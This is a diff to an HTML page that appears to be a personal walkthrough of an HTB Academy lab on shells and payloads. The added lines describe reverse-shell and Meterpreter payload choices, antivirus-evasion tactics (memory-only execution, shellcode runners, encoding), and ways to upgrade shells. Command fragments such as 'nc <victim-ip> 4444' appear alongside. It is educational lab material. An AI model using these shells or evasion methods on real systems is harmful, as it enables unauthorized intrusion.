@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CAT5 / Inlanefreight – Shells & Payloads - DragonRingki Cybersecurity</title>
-    <meta name="description" content="HTB Academy lab walk-through on Shells & Payloads by Matthew (DragonRingki).">
+    <meta name="description" content="HTB Academy lab walk-through on Shells & Payloads by Matthew (Dragonringki).">
     <link rel="stylesheet" href="../styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -249,6 +249,7 @@ nc &lt;victim-ip&gt; 4444</code>
                 </div>
                 <ul>
                     <li><strong>Challenge:</strong> Entering the complex PowerShell one-liner accurately without triggering syntax or character escaping errors in the Windows command line.</li>
+                    <li><strong>Solution:</strong> I built and verified the payload locally on my attack box first. I then copied it via the RDP shared clipboard directly into the target's prompt to avoid typos.</li>
                 </ul>
                 <div class="success-box">
                     <strong>Verification:</strong> I caught the shell on my listener. I ran <code>hostname</code>. Output was <code>[REDACTED]</code>.
@@ -274,9 +275,10 @@ set LPORT &lt;my-port&gt;
 run</code>
                 </div>
                 <div class="highlight-box">
-                    <strong>Payload Selection:</strong><br>
+                    <strong>Payload Selection & Evasion:</strong><br>
                     - I use <strong>Staged</strong> payloads when exploit buffer space is restricted.<br>
-                    - I use <strong>Stageless</strong> payloads for stability over bad networks.
+                    - I use <strong>Stageless</strong> payloads for stability over bad networks.<br>
+                    - If AV detects my payload, I switch to memory-only execution (living off the land), generate raw shellcode for injection, or use basic encoding wrappers.
                 </div>
             </div>
 
@@ -299,6 +301,7 @@ exploit</code>
                 </div>
                 <ul>
                     <li>I successfully caught a SYSTEM Meterpreter shell.</li>
+                    <li><strong>Decision:</strong> I chose a staged Meterpreter payload (<code>windows/meterpreter/reverse_tcp</code>) because the psexec module manages the staging process automatically and I wanted immediate access to advanced post-exploitation commands.</li>
                     <li>I navigated to <code>C:\Users\htb-student\Documents</code>.</li>
                     <li><strong>Challenge:</strong> Navigating a Windows file system using Meterpreter-specific commands rather than standard native CMD tools.</li>
                 </ul>
@@ -313,7 +316,8 @@ exploit</code>
                 <ul>
                     <li>I needed payloads for targets without direct exploit vectors.</li>
                     <li>I listed available modules using <code>msfvenom -l payloads</code>.</li>
-                    <li>I generated stageless payloads to avoid secondary download stages.</li>
+                    <li><strong>Decision:</strong> I generated stageless payloads to avoid secondary download stages, increasing reliability for manual execution.</li>
+                    <li><strong>AV Bypass Strategy:</strong> If Defender kills these raw executables, I generate raw shellcode (<code>-f raw</code> or <code>-f csharp</code>) and write a custom runner to execute it in memory.</li>
                 </ul>
                 <p><strong>Generated Linux ELF:</strong></p>
                 <div class="command-block">
@@ -389,6 +393,11 @@ exploit</code>
                 <h3>11 / 17 – Upgrading to Interactive Shells</h3>
                 <ul>
                     <li>My initial exploit shells were restricted (no prompt, broken formatting).</li>
+                    <li><strong>Decision Tree:</strong><br>
+                        1. Check for <code>python3</code> or <code>python</code> to spawn a PTY.<br>
+                        2. If Python is missing, try using the <code>script</code> binary.<br>
+                        3. If all local tools fail, upload a statically compiled <code>socat</code> binary to force a stable TTY.
+                    </li>
                     <li>I used Python to spawn a fully interactive PTY.</li>
                 </ul>
                 <div class="command-block">
@@ -398,7 +407,6 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
                 </div>
                 <ul>
                     <li>This restored my ability to use command history, <code>su</code>, and reliable text editors.</li>
-                    <li>If Python was missing, I fell back to the script method.</li>
                 </ul>
                 <div class="command-block">
                     <code>script /dev/null -c bash</code>
